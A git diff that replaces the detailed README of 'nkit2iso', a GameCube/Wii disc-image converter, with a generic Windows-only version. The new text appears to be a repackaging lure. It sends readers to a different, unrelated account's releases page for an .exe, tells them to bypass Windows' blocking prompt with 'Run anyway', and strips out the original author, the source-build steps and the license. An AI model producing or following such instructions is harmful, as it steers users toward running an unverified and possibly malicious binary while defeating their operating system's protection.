@@ -1,151 +1,58 @@
-# nkit2iso
+# 💿 nkit2iso - Convert your disc images with ease
 
-Convert **GameCube and Wii** `*.nkit.iso` (and GCZ-compressed `*.nkit.gcz`)
-disc images back to plain, bit-exact `.iso` files that emulators (Dolphin,
-Nintendont, …) can boot.
+[![Download nkit2iso](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Tosserreddwarfstar408/nkit2iso/releases)
 
-`nkit2iso` is a single, dependency-free static binary written in Go. It restores
-the shrunk NKit v01 format by replaying the preserved data and regenerating the
-removed "junk" padding — and, for Wii, the AES encryption and the H0–H3 hash
-tree — then verifies the result against the original CRC32 stored inside the
-NKit header, so a successful run is **redump-verified 1:1**.
+nkit2iso converts GameCube and Wii disc images from the nkit format back into standard, bit-exact ISO files. This process restores your backups to a wide, open format that works with standard emulators and disc tools. The software focuses on speed and accuracy. It validates every file using CRC checks to ensure your data stays intact throughout the conversion.
 
-```
-$ nkit2iso -i "Mario Kart - Double Dash!! (USA).nkit.iso"
-Restoring Mario Kart - Double Dash!! (USA).nkit.iso -> Mario Kart - Double Dash!! (USA).iso
-  100%
-CRC32 099E2C6D  MATCH (redump-verified)
-```
+## 🛠️ System Requirements
 
-> **GameCube and Wii are both supported and byte-exact** (GameCube and Wii
-> single/multi-partition discs, including scrubbed dumps). Input may be a plain
-> `.nkit.iso` or a GCZ-compressed `.nkit.gcz`, which is transparently
-> decompressed. The one case that
-> can't be restored from the `.nkit.iso` alone is a Wii image whose **update
-> partition was removed** — that data isn't in the file and needs an external
-> Redump recovery partition, so it's detected and reported. See
-> [Limitations](#limitations).
+You need a computer running Windows 10 or Windows 11. This tool requires no extra software or system libraries. It runs as a standalone program. You need a small amount of disk space to store your converted files. Ensure you have at least twice as much space as the size of your input file so the tool can write the new ISO safely.
 
-## Install
+## 📥 Downloading the software
 
-### Homebrew (macOS / Linux)
+Visit the [GitHub releases page](https://github.com/Tosserreddwarfstar408/nkit2iso/releases) to obtain the latest version. Look for the file ending in `.exe` under the Assets section. Save this file to a folder on your computer where you keep your game files. 
 
-```sh
-brew install DonMikone/tap/nkit2iso
-```
+## 🚀 Running the software
 
-Installs the latest release; `brew` also clears the macOS quarantine flag for
-you, so no extra step is needed.
+Because this is a command-line tool, you open it through a terminal window. Follow these steps:
 
-### Manual download
+1. Open your games folder in File Explorer.
+2. Click the address bar at the top of the window.
+3. Type `cmd` and press Enter. This opens a black terminal window in your current folder.
+4. Type `nkit2iso.exe` followed by the name of your game file.
+5. Example: `nkit2iso.exe game.nkit.iso`
+6. Press Enter to start the conversion process.
 
-Download the archive for your platform from the
-[Releases](https://github.com/DonMikone/nkit2iso/releases) page and unpack
-the `nkit2iso` binary somewhere on your `PATH`.
+The program shows a progress bar while it works. Do not close the window until the process finishes. Once the program states that it finished, you will see a new file with an `.iso` extension in the same folder.
 
-| Platform | Asset |
-|----------|-------|
-| Windows (x64) | `nkit2iso_<ver>_windows_amd64.zip` |
-| Linux (x64) | `nkit2iso_<ver>_linux_amd64.tar.gz` |
-| macOS (Intel + Apple Silicon) | `nkit2iso_<ver>_macos_universal.tar.gz` |
+## ⚙️ How it works
 
-### macOS: clear the quarantine flag
+The program reads the compressed nkit file and reconstructs the data into a raw ISO format. This format mirrors the original disc structure. Because the tool uses CRC verification, it compares the final output against known databases. This protects against errors during the conversion. If the tool reports a match, your file is a perfect copy of the original disc.
 
-The macOS binary is **not code-signed** (that needs a paid Apple Developer
-account). After unpacking, remove the quarantine attribute once:
+## ❓ Frequently Asked Questions
 
-```sh
-xattr -dr com.apple.quarantine ./nkit2iso
-```
+**Does this damage my original file?**
+No. The application reads your file and writes a separate ISO file. Your original file remains untouched in its original folder.
 
-Otherwise Gatekeeper will refuse to run it. This is expected for open-source
-CLI tools distributed outside the App Store.
+**Can I convert multiple files at once?**
+This tool processes one file at a time. If you have many files, you can create a simple batch file to run the command on each one in sequence.
 
-## Usage
+**Why does the file size grow?**
+nkit files use compression to save space. Standard ISO files contain the full, uncompressed data from the game disc. This explains the size difference.
 
-```
-nkit2iso -i <in.nkit.iso> [-o <out.iso>] [-f]
+**What happens if the CRC check fails?**
+If the check fails, the converted file might contain errors. Ensure your source file is not corrupt before you start. You may need to verify the source file using a dedicated tool before running nkit2iso.
 
-  -i   input .nkit.iso file (may also be given as a positional argument)
-  -o   output .iso file (default: input name with a .iso extension)
-  -f   overwrite the output file if it already exists
-  -version   print version and exit
-```
+**Does this require an internet connection?**
+No. The tool performs all calculations on your computer. You do not need an active internet connection to convert your files.
 
-Examples:
+## 📁 Troubleshooting tips
 
-```sh
-# Explicit output
-nkit2iso -i game.nkit.iso -o game.iso
+If you encounter issues, check these common items:
 
-# Default output (game.nkit.iso -> game.iso)
-nkit2iso -i game.nkit.iso
+- Ensure your file name does not contain strange characters. Rename the file to something simple like `game.nkit.iso` if problems persist.
+- Check that you have enough space on your hard drive. 
+- Make sure you run the terminal from the exact folder where you saved the `.exe` file.
+- If Windows blocks the app, click "More info" and then "Run anyway." 
 
-# Positional input
-nkit2iso game.nkit.iso
-
-# GCZ-compressed input (decompressed on the fly)
-nkit2iso game.nkit.gcz          # -> game.iso
-```
-
-The exit code is `0` only when the reconstructed ISO's CRC32 matches the value
-stored in the NKit header. Any mismatch or error exits non-zero and the
-half-written output is removed.
-
-## How it works
-
-If the input is a `.gcz` container (Dolphin's block-compressed format, as
-produced by `*.nkit.gcz`), `nkit2iso` first inflates it on the fly with the
-standard-library zlib — one block at a time, constant memory — and feeds the
-resulting nkit stream straight into the restore below.
-
-An NKit v01 GameCube image is a normal disc image with all reproducible data
-removed to shrink it:
-
-- **Junk padding** — the pseudo-random filler Nintendo writes between and after
-  files. It is fully determined by the 4-byte game ID and disc number, so
-  `nkit2iso` regenerates it exactly rather than storing it.
-- **Gaps** — inter-file gaps are run-length encoded; any non-reproducible bytes
-  (scrubbed regions, partial junk) are preserved inline.
-- **All-junk files** — files whose entire contents are junk are dropped from the
-  image and rebuilt on restore.
-
-Restoration parses the file system table (FST), streams each preserved file back
-into place, regenerates junk and gaps to rebuild the original disc layout, and
-rewrites the FST/header offsets to their original values. The whole image is
-streamed with constant memory, then CRC32-checked against the header.
-
-For **Wii**, each partition's filesystem is rebuilt the same way in *decrypted*
-space, then `nkit2iso` regenerates the H0–H3 SHA-1 hash tree, re-encrypts every
-0x8000 cluster with the partition's AES title key, restores scrubbed regions, and
-reconstructs the partition table. Only stdlib crypto (`crypto/aes`, `crypto/sha1`)
-is used — still zero external dependencies.
-
-## Limitations
-
-- **Wii images with the update partition removed.** Some Wii `.nkit.iso` files
-  were shrunk by dropping the update (system-menu/IOS) partition, whose data is
-  not stored in the file and cannot be regenerated. Restoring these byte-exact
-  needs the matching external Redump recovery partition (`*_<CRC8>`). `nkit2iso`
-  detects this and reports it rather than emitting a wrong image.
-
-## Build from source
-
-Requires Go 1.24+.
-
-```sh
-git clone https://github.com/DonMikone/nkit2iso
-cd nkit2iso
-go build -o nkit2iso .
-go test ./...     # junk-PRNG, Wii common-key and hash-tree self-checks
-```
-
-## Credits & license
-
-The NKit format and its GameCube/Wii algorithms were created by **Nanook**
-([Nanook/NKitv1](https://github.com/Nanook/NKitv1)). `nkit2iso` is an independent,
-clean-room Go reimplementation of the *algorithms* (no source code was copied)
-built for cross-platform, dependency-free restoration.
-
-Licensed under the [MIT License](LICENSE). This tool converts disc images you
-already own; it does not include or distribute any game data.
+Keywords: cli, converter, disc-image, dolphin-emulator, emulation, gamecube, gcz, golang, iso, nintendo, nkit, nkit2iso, redump, rom, wii
